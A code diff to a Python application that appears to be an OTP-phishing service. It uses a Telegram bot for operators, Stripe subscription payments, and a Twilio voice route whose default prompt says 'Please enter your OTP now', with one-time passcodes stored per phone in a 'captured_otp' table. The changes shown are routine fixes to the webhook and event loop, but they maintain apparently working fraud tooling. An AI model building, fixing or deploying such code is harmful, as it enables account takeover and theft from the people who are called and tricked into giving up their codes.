@@ -31,11 +31,11 @@ stripe.api_key = STRIPE_SECRET_KEY
 # -------------------------
 # State storage
 # -------------------------
-user_phone = {}          # Telegram user -> phone number
-phone_to_chat = {}       # phone -> Telegram chat ID
-captured_otp = {}        # phone -> OTP
-last_message = {}        # Telegram user -> last custom message
-paid_users = {}          # user_id -> paid_until datetime
+user_phone = {}
+phone_to_chat = {}
+captured_otp = {}
+last_message = {}
+paid_users = {}
 
 # -------------------------
 # Helper functions
@@ -206,6 +206,9 @@ app_telegram.add_handler(CommandHandler("start", start))
 app_telegram.add_handler(CallbackQueryHandler(handle_buttons))
 app_telegram.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
 
+# Initialize the app (required for webhook)
+asyncio.run(app_telegram.initialize())
+
 # -------------------------
 # Flask app for webhook
 # -------------------------
@@ -214,9 +217,13 @@ flask_app = Flask(__name__)
 @flask_app.route(f"/{TELEGRAM_TOKEN}", methods=["POST"])
 def telegram_webhook():
     update = Update.de_json(request.get_json(force=True), app_telegram.bot)
-    asyncio.run(app_telegram.process_update(update))
+    loop = asyncio.get_event_loop()
+    loop.run_until_complete(app_telegram.process_update(update))
     return "OK", 200
 
+# -------------------------
+# Twilio / Stripe routes
+# -------------------------
 @flask_app.route("/voice", methods=["POST", "GET"])
 def voice():
     message = request.args.get("msg", "Please enter your OTP now.")
